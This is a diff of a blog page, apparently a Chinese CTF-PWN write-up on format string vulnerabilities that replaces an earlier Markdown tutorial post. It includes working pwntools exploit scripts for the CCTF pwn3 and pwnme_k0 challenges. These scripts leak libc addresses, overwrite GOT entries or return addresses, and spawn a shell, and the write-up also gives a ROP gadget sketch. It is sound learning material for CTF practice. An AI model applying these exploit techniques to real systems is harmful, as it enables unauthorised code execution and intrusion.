@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="My First Blog, XiaozaYa&#39;s Blog">
-    <meta name="description" content="Markdown简单使用">
+    <meta name="keywords" content="格式化字符串例题, XiaozaYa&#39;s Blog">
+    <meta name="description" content="格式化字符串漏洞例题">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>My First Blog | XiaozaYa&#39;s Blog</title>
+    <title>格式化字符串例题 | XiaozaYa&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -47,7 +47,9 @@
 
 
 
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
     <link rel="stylesheet" href="/css/post.css">
+
 
 
 
@@ -319,12 +321,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">My First Blog</h1>
+                    <h1 class="description center-align post-title">格式化字符串例题</h1>
                 </div>
             </div>
         </div>
@@ -334,10 +336,12 @@
 
 
 
-<main class="container content">
+<main class="post-container content">
 
     
-    <!-- 文章内容详情 -->
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
 <div id="artDetail">
     <div class="card">
         <div class="card-content article-info">
@@ -346,8 +350,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Markdown/">
-                                <span class="chip bg-color">Markdown</span>
+                            <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/">
+                                <span class="chip bg-color">格式化字符串漏洞的利用</span>
                             </a>
                         
                     </div>
@@ -358,8 +362,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Markdown/" class="post-category">
-                                Markdown
+                            <a href="/categories/CTF-PWN/" class="post-category">
+                                CTF-PWN
                             </a>
                         
                     </div>
@@ -371,28 +375,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-04-02
+                    2023-04-09
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-04
+                    2023-04-11
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    814
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    5 分
                 </div>
                 
 
@@ -415,62 +419,196 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Markdown-标题"><a href="#Markdown-标题" class="headerlink" title="Markdown 标题"></a>Markdown 标题</h1><p>“#”   =&gt; 一级标题<br>“##” =&gt; 二级标题，以此类推，一共六级标题。</p>
-<h1 id="Markdown文本"><a href="#Markdown文本" class="headerlink" title="Markdown文本"></a>Markdown文本</h1><ul>
-<li>斜体：可以在需要标注为斜体文本前及斜体文本结尾，输入一个星号<code>*</code>或者一个下划线 <code>_</code>；<br>eg：<code>*斜体*</code> ⇒ <em>斜体</em>   <code>_斜体_</code>⇒ <em>斜体</em></li>
-<li>粗体：<code>**</code>或者<code>__</code></li>
-<li>斜粗体：<code>***</code>或者<code>___</code></li>
-</ul>
-<h1 id="Markdown列表"><a href="#Markdown列表" class="headerlink" title="Markdown列表"></a>Markdown列表</h1><p>1）无序列表：使用星号(<code>*</code>)、加号(<code>+</code>)或是减号(<code>-</code>)，再加一个空格作为列表标记；<br>2）有序列表：使用数字并加上 <code>.</code> 号，再加一个空格作为列表标记；<br>note：如果要控制列表的层级，则需要在符号 前使用 <code>tab</code>，如下：</p>
+                <p>[TOC]</p>
+<h2 id="64-位程序格式化字符串漏洞"><a href="#64-位程序格式化字符串漏洞" class="headerlink" title="64 位程序格式化字符串漏洞"></a>64 位程序格式化字符串漏洞</h2><p>64位与32 位区别：<strong>64 位函数的前 6 个参数是存储在相应的寄存器中的</strong>。那么在格式化字符串漏洞中，虽然我们并没有向相应寄存器中放入数据，但是程序依旧会按照格式化字符串的相应格式对其进行解析。</p>
+<h3 id="2017-UIUCTF-pwn200-GoodLuck"><a href="#2017-UIUCTF-pwn200-GoodLuck" class="headerlink" title="2017-UIUCTF-pwn200-GoodLuck"></a>2017-UIUCTF-pwn200-GoodLuck</h3><p>64位小端序，开启了Canary和NX</p>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-1.png"></p>
+<p>程序逻辑如下：</p>
 <ul>
-<li>无序列表 1</li>
-<li>无序列表 2<ul>
-<li>无序列表 2.1</li>
-<li>无序列表 2.2</li>
+<li>flag、flag_都是局部变量，是保存在栈中的，所以可以直接利用格式化字符串漏洞将flag给打印出来</li>
+</ul>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-2.png"></p>
+<p>可以使用fmtarg工具算出flag格式化字符串偏移为：9，所以直接%9$s即可</p>
+<ul>
+<li>使用工具时注意：我们必须 break 在 printf 处。</li>
+</ul>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-3.png"></p>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/1-4.png"></p>
+<h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><p>wiki:）在目前的 C 程序中，libc 中的函数都是通过 GOT 表来跳转的。此外，在没有完全开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如说我们可以修改 printf 的 got 表项内容为 system 函数的地址。从而，程序在执行 printf 的时候实际执行的是 system 函数。</p>
+<p>假设我们<strong>将函数 A 的地址覆盖为函数 B 的地址</strong>，那么这一攻击技巧可以分为以下步骤：</p>
+<ul>
+<li><p>确定函数 A 的 GOT 表地址。</p>
+<ul>
+<li>这一步我们利用的函数 A 一般在程序中已有，所以可以采用简单的寻找地址的方法来找。</li>
+</ul>
+</li>
+<li><p>确定函数 B 的内存地址</p>
+<ul>
+<li>这一步通常来说，需要我们自己想办法来泄露对应函数 B 的地址。</li>
+</ul>
+</li>
+<li><p>将函数 B 的内存地址写入到函数 A 的 GOT 表地址处。</p>
+<ul>
+<li><p>这一步一般来说需要我们利用函数的漏洞来进行触发。一般利用方法有如下两种</p>
+<ul>
+<li>写入函数：write 函数。</li>
+<li>ROP</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">pop eax; ret;           # printf@got -&gt; eax
+pop ebx; ret;           # (addr_offset = system_addr - printf_addr) -&gt; ebx
+add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li>格式化字符串任意地址写</li>
 </ul>
 </li>
 </ul>
-<h1 id="Markdown链接"><a href="#Markdown链接" class="headerlink" title="Markdown链接"></a>Markdown链接</h1><p>格式：<code>[链接名称](链接地址)</code>或者&lt;链接地址&gt;<br>eg:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343">XiaozaYa</a>或者<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343">https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343</a></p>
-<h1 id="Markdown引用"><a href="#Markdown引用" class="headerlink" title="Markdown引用"></a>Markdown引用</h1><p>格式：在符号 <code>&gt;</code> 后面书写文字，或者加一个空格再加文字；<br>eg：</p>
-<blockquote>
-<p>hello:<br>Welcome</p>
-</blockquote>
-<p>除正常引用外，还可以嵌套，一个 <code>&gt;</code> 符号在第一层，两个 <code>&gt;</code> 符号是第二层，以此类推，如下：</p>
-<blockquote>
-<p>这是一个引用:</p>
-<blockquote>
-<p>welcome</p>
-<blockquote>
-<p>快来玩啊！</p>
-</blockquote>
-</blockquote>
-</blockquote>
-<h1 id="Markdown分割线"><a href="#Markdown分割线" class="headerlink" title="Markdown分割线"></a>Markdown分割线</h1><h2 id="格式：在一行中用三个-或者-来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用-时就会变成放大上面的字；eg-Welcome-我爱你！"><a href="#格式：在一行中用三个-或者-来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用-时就会变成放大上面的字；eg-Welcome-我爱你！" class="headerlink" title="格式：在一行中用三个 - 或者 * 来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用-时就会变成放大上面的字；eg:Welcome!***我爱你！"></a>格式：在一行中用三个 <code>-</code> 或者 <code>*</code> 来建立一个分隔线，同时需要在分隔线的上面空一行；如果不留空格，当用<code>-</code>时就会变成放大上面的字；<br>eg:<br>Welcome!<br>***<br>我爱你！</h2><hr>
-<hr>
-<h1 id="Markdown删除线"><a href="#Markdown删除线" class="headerlink" title="Markdown删除线"></a>Markdown删除线</h1><p>格式：在需要删除的文字前后各使用两个 <code>~</code>；<br>eg：<br><del>删除线</del></p>
-<h1 id="Markdown下划线"><a href="#Markdown下划线" class="headerlink" title="Markdown下划线"></a>Markdown下划线</h1><p>格式：在需要添加下划线的文字首部和尾部加上 <code>&lt;u&gt;文本&lt;/u&gt;</code>；<br>eg：<br><u>下划线</u></p>
-<h1 id="Markdown表格"><a href="#Markdown表格" class="headerlink" title="Markdown表格"></a>Markdown表格</h1><p>格式：表格使用 <code>|</code> 来分隔不同的单元格，使用 <code>-</code> 来分隔表头和其他行，如果想调整表格的左对齐、右对齐、居中对齐:</p>
-<ul>
-<li><code>:-</code>：将表头及单元格的内容左对齐；</li>
-<li><code>-:</code>：将表头及单元格的内容左对齐；</li>
-<li><code>:-:</code>：将表头及单元格的内容居中对齐；<br>eg：<br>|姓名|年龄|工作|<br>| :—– 	| :–: | ——-:|<br>| 小可爱 	|  18  | 吃可爱多 	 |<br>| 小小勇敢 	|  20  | 爬棵勇敢树 	 |<br>| 小小小机智 |  22  | 看一本机智书 |</li>
+</li>
 </ul>
-<p>|姓名|年龄|工作|<br>| :—– 	| :–: | ——-:|<br>| 小可爱 	|  18  | 吃可爱多 	 |<br>| 小小勇敢 	|  20  | 爬棵勇敢树 	 |<br>| 小小小机智 |  22  | 看一本机智书 |</p>
-<h1 id="Markdown图片"><a href="#Markdown图片" class="headerlink" title="Markdown图片"></a>Markdown图片</h1><p>格式：<code>![图片描述](图片地址)</code><br>note：</p>
+<h3 id="2016-CCTF-pwn3"><a href="#2016-CCTF-pwn3" class="headerlink" title="2016-CCTF-pwn3"></a>2016-CCTF-pwn3</h3><p>32位小端序，只开了NX保护</p>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-1.png"></p>
+<p>程序关键说明：</p>
 <ul>
-<li>如果是行内图片则无图例，否则有图例；</li>
-<li>仅支持 https 的图片，图片粘贴到网页编辑器后，会自动上传到服务器；如果是本地编辑器，需要有一个相对路径用来存储保存的图片。</li>
-<li>支持 <code>jpg、png、gif、svg</code> 等图片格式，<strong>其中 svg 文件仅可在微信公众平台中使用</strong>。<br><img src="http://image.luokangyuan.com/4027734.jpeg" alt="图片:【heihei】"></li>
+<li>程序有put，get，show三个功能<ul>
+<li>put：上传一个文件包括name和content</li>
+<li>get：输出指定name文件的content</li>
+<li>show：把所有文件的名字拼接起来然后puts出来（后上传的文件名字在前面</li>
 </ul>
-<h1 id="Markdown脚注"><a href="#Markdown脚注" class="headerlink" title="Markdown脚注"></a>Markdown脚注</h1><p>格式：<code>[文字](脚注解释 "脚注名字")</code><br>eg：<br>脚注：<a href="%E8%84%9A%E6%B3%A8%E8%A7%A3%E9%87%8A" title="脚注名字">文字</a></p>
-<h1 id="Markdown代码块"><a href="#Markdown代码块" class="headerlink" title="Markdown代码块"></a>Markdown代码块</h1><p>格式：如果在一个行内需要引用代码，只要用反引号引起来就好；<br>eg：Use the <code>printf()</code> function.</p>
+</li>
+</ul>
+<p>文件在内存中结构如下：</p>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-3.png"></p>
+<p>漏洞点：</p>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-2.png"></p>
+<p>我们可以发现get输出文件内容时，直接printf(dest)；</p>
+<p>利用方法：</p>
 <ul>
-<li>如果是在一个块内需要引用代码，则在需要高亮的代码块的前一行及后一行使用三个反引号，同时 <strong>第一行反引号后面表示代码块所使用的语言</strong>，如下：<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;
-int main(){
-	printf("Hello World\n");
-	return 0;
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>利用格式化字符串漏洞任意读打印出puts函数真实地址，从而计算出libc_base</li>
+<li>利用格式化字符串漏洞任意写把puts函数的got表项内容改写为system函数的地址</li>
+<li>然后执行puts(‘/bin/sh;’) ==&gt; system(‘/bin/sh;’) <ul>
+<li>这里把文件名设置为<code>/bin/sh;</code>然后调用show就行，这里加<code>;</code>是因为show会把所有的文件名连起来然后输出，<code>;</code>可以造成截断</li>
+<li>也可以把第一个文件名设置为<code>h</code>,把第二个文件名设置为<code>/bin/s</code>，这样最后合起来就是<code>/bin/sh</code>（亲测可行</li>
 </ul>
+</li>
+</ul>
+<p>exp：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment">#context.log_level = 'debug'</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn3"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc
+
+<span class="token keyword">def</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	s <span class="token operator">=</span> <span class="token string">'sysbdmin'</span>
+	p <span class="token operator">=</span> <span class="token string">''</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
+		p <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+	<span class="token keyword">print</span> p
+	io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'get:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+	<span class="token keyword">return</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'put'</span><span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'upload:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ftp&gt;'</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">)</span>
+
+<span class="token comment">#rxraclhm</span>
+name<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%7$s'</span>
+put<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>get<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+
+system <span class="token operator">=</span> addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+
+<span class="token comment">#fmtstr_payload(offset, {addr:value})</span>
+<span class="token comment">#把addr处的值修改为value,offset为格式化字符串的偏移</span>
+payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>system<span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> payload
+
+put<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+get<span class="token punctuation">(</span><span class="token string">'/bin/sh;'</span><span class="token punctuation">)</span>
+show<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/2-4.png"></p>
+<h2 id="hijack-retaddr"><a href="#hijack-retaddr" class="headerlink" title="hijack retaddr"></a>hijack retaddr</h2><h3 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme_k0"></a>三个白帽 - pwnme_k0</h3><p>程序RELRO保护全开（无法打got，开启了NX</p>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-1.png"></p>
+<p>程序功能：</p>
+<ul>
+<li>最开始，注册账号，密码</li>
+<li>选项1：输出账号，密码 – show</li>
+<li>选项2：修改账号，密码 – edit</li>
+</ul>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-2.png"></p>
+<p>漏洞点：</p>
+<ul>
+<li>输出账号，密码时存在格式化字符串漏洞<ul>
+<li>第一个printf输出账号</li>
+<li>第二个printf输出密码</li>
+</ul>
+</li>
+</ul>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-0.png"></p>
+<p>发现程序存在后门：</p>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-4.png"></p>
+<p>思路：修改返回地址到后门函数处</p>
+<ul>
+<li>泄漏show函数的存储返回地址的栈地址</li>
+<li>修改返回地址为0x4008AA</li>
+</ul>
+<p>动态调试，把断点下在输出密码的printf处，账号输入AAAAAAAA,密码输入BBBBBBBB</p>
+<ul>
+<li>可以看到函数返回地址存储在0x7fffffffdd38处，而rbp（为格式化字符串的第6个参数）里面存储的是栈地址0x7fffffffdd70，虽然栈的地址是变化的，但是两者的偏移是不变的。<ul>
+<li>0x7fffffffdd70 - 0x7fffffffdd38 = 0x38</li>
+</ul>
+</li>
+<li>账号存储在0x7fffffffdd40，为格式化字符串的第8个参数</li>
+<li>密码(格式化字符串)在第10个偏移处</li>
+</ul>
+<p>所以我们可以先用<code>%6$p</code>泄漏处rbp，然后利用<code>rbp-0x38</code>计算出存储返回地址的位置ret_addr，然后修改账号为<code>rer_addr</code>，密码为<code>'%2218c' + '%8$hn'</code>，然后show即可</p>
+<ul>
+<li>可以看到返回地址为0x400d74，system_addr = 0x4008AA ==&gt; 0x40都是一样的，所以我们只需要写入两个字节即写入<code>08AA</code> ==&gt; 2218</li>
+</ul>
+<p><img src="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/3-3.png"></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+<span class="token comment">#context.log_level = 'debug'</span>
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwnme_k0"</span><span class="token punctuation">)</span>
+
+backdoor <span class="token operator">=</span> <span class="token number">0x4008AA</span>
+
+payload <span class="token operator">=</span> <span class="token string">'%6$p'</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> <span class="token string">'XiaozaYa'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'XiaozaYa\n'</span><span class="token punctuation">)</span>
+rbp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+ret_addr <span class="token operator">=</span> rbp <span class="token operator">-</span> <span class="token number">0x38</span>
+<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'%2218c'</span> <span class="token operator">+</span> <span class="token string">'%8$hn'</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">': \n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -497,7 +635,7 @@ int main(){
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://XiaozaYa.github.io/2023/04/02/start-blog/">http://XiaozaYa.github.io/2023/04/02/start-blog/</a>
+                    <a href="http://XiaozaYa.github.io/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/">http://XiaozaYa.github.io/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -535,8 +673,8 @@ int main(){
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Markdown/">
-                                    <span class="chip bg-color">Markdown</span>
+                                <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/">
+                                    <span class="chip bg-color">格式化字符串漏洞的利用</span>
                                 </a>
                             
                         </div>
@@ -582,84 +720,36 @@ int main(){
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/04/03/sql/">
+                <a href="/2023/04/09/ge-shi-hua-zi-fu-chuan-li-ti/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/24.jpg" class="responsive-img" alt="SQL语法">
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="格式化字符串例题">
                         
-                        <span class="card-title">SQL语法</span>
+                        <span class="card-title">格式化字符串例题</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SQL语法，以MySQL为例结合菜鸟教程，对学校数据库学习做简要记录。
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-04-03
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-category">
-                                    数据库
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/SQL/">
-                        <span class="chip bg-color">SQL</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/04/02/start-blog/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="My First Blog">
-                        
-                        <span class="card-title">My First Blog</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Markdown简单使用
+                            格式化字符串漏洞例题
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-02
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-04-09
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Markdown/" class="post-category">
-                                    Markdown
+                            <a href="/categories/CTF-PWN/" class="post-category">
+                                    CTF-PWN
                                 </a>
                             
                             
@@ -670,8 +760,57 @@ int main(){
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Markdown/">
-                        <span class="chip bg-color">Markdown</span>
+                    <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/">
+                        <span class="chip bg-color">格式化字符串漏洞的利用</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/04/09/canary/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Canary">
+                        
+                        <span class="card-title">Canary</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Canary概述及其绕过方法
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
